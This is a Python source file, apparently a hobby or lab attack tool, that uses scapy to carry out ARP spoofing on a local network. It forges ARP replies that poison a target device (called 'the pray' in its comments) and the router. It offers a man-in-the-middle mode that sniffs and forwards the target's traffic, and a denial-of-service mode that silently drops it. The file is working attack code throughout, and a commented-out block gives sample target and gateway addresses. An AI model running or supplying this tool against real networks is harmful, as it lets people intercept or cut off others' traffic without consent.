from scapy.sendrecv import sniff
from scapy.all import srp, sendp, send, IP, TCP, UDP
from scapy.layers.l2 import ARP , Ether
import time

class ArpSpoofing:
    def __init__(self):
        pass

    def get_mac(self, ip:str, callback = None, stop_event = None) -> str:
        mac = None
        while not mac:
            if stop_event and stop_event.is_set():
                break
            mac = self.send_arp_request(ip)
            if not mac and callback:
                callback(f"MAC address for: {ip} not found")
        return mac

    def send_arp_request(self, dest_ip: str, source_ip =""): # get_mac
        if not source_ip:
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=dest_ip)
        else:
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=dest_ip ,psrc=source_ip)
        
        #arp_request.show()
        # ether = Ether("ff:ff:ff:ff:ff:ff")
        # request = ether / arp_packet # / operator stacks layer in scapy
        # request.show()
        answered, _ = srp(arp_request, timeout=3, verbose=False)
        if answered:
            return answered[0][1].src
        return None
        

    def send_arp_response(self, dest_ip: str, dest_mac: str, source_ip: str = "", source_mac: str = ""):
        # Send ARP Reply (is-at)
        if source_mac:
            arp_reply = ARP(pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac, op="is-at")
            ether_frame = Ether(dst=dest_mac, src=source_mac)
        else:
            arp_reply = ARP(pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, op="is-at")
            ether_frame = Ether(dst=dest_mac)

        sendp(ether_frame/arp_reply, verbose=0)

    def forward_packet(self, pkt, target_ip, target_mac, attacker_mac, callback, forwarded_ips):
        # 1. Check if it's an IP packet
        # 2. Check if the Destination IP is the phone
        # 3. Check if the Destination MAC is YOURS (so we don't loop)
        if pkt.haslayer(IP) and pkt[IP].dst == target_ip:
            if pkt[Ether].dst == attacker_mac:
                # Change the destination MAC to the phone's real MAC
                pkt[Ether].dst = target_mac
                # Optional: Delete checksums so Scapy recalculates them
                # This prevents the phone from dropping "corrupt" packets
                if pkt.haslayer(IP):
                    del pkt[IP].chksum
                if pkt.haslayer('TCP'):
                    del pkt['TCP'].chksum
                elif pkt.haslayer('UDP'):
                    del pkt['UDP'].chksum

            # Send the packet back out onto the network
            sendp(pkt, verbose=False)
            
            ip_pair = (pkt[IP].src, pkt[IP].dst)
            if ip_pair not in forwarded_ips:
                forwarded_ips.add(ip_pair)
                callback(f"[*] Forwarding traffic between {pkt[IP].src} and {pkt[IP].dst}")
        
    # target ip and mac - the ip and mac of the pray, default gateway - the ip of the router
    def spoof_device(self, target_ip:str, default_gateway:str, is_mitm:bool, attacker_ip:str = "",stop_event = None, callback = None):
        def smart_sleep(secs):
            for _ in range(int(secs*10)):
                if stop_event.is_set():
                    return True
                time.sleep(0.1)
            return False
            
        def resolve_mac(ip, name):
            if not ip:
                return ""
            mac = self.get_mac(ip, callback, stop_event)
            if not mac:
                callback(f"Error: Could not find MAC for {name} ({ip}). Spoofing stopped.")
                return None
            callback(f"{name} mac: {mac}")
            return mac

        target_mac = resolve_mac(target_ip, "Target")
        router_mac = resolve_mac(default_gateway, "Router")
        
        attacker_mac = None
        if attacker_ip:
            attacker_mac = resolve_mac(attacker_ip, "Attacker")

        if is_mitm and not stop_event.is_set():
            callback("Spoofing (MITM) active...")
            callback(f"[*] Starting manual forwarder for {target_ip}...")
        else:
            callback("Spoofing (DoS) active...")

        forwarded_ips = set()

        while not stop_event.is_set():
            try:
                if is_mitm:
                    # Full MITM: packets go through the attacker
                    self.send_arp_response(dest_ip=target_ip, dest_mac=target_mac, 
                                           source_ip=default_gateway, source_mac=attacker_mac) #tricks pray
                    self.send_arp_response(dest_ip=default_gateway, dest_mac=router_mac, 
                                           source_ip=target_ip, source_mac=attacker_mac) # tricks router

                    sniff(filter=f"ip dst {target_ip}", 
                          prn=lambda pkt: self.forward_packet(pkt, target_ip, target_mac, attacker_mac, callback, forwarded_ips), 
                          store=0, 
                          stop_filter=lambda x: stop_event.is_set(),
                          timeout=1)
                          
                else:
                    # DoS: Tell the target that the router is at our MAC (causes them to send packets to us, and we don't forward them)
                    self.send_arp_response(dest_ip=target_ip, dest_mac=target_mac, 
                                source_ip=default_gateway, source_mac=attacker_mac)

                if smart_sleep(1):
                    break
            except Exception as e:
                callback(f"Error: {e}")
                break
        callback("Spoofing disabled\n")  

    

# if __name__ == "__main__":
#     attacker_ip = "192.168.24.251"
#     attacker_mac = get_mac(attacker_ip)
#     gateway_ip = "192.168.24.1" #default gateway
#     target_ip ="192.168.24.158"


#     spoof_device(target_ip=target_ip, default_gateway=gateway_ip)  


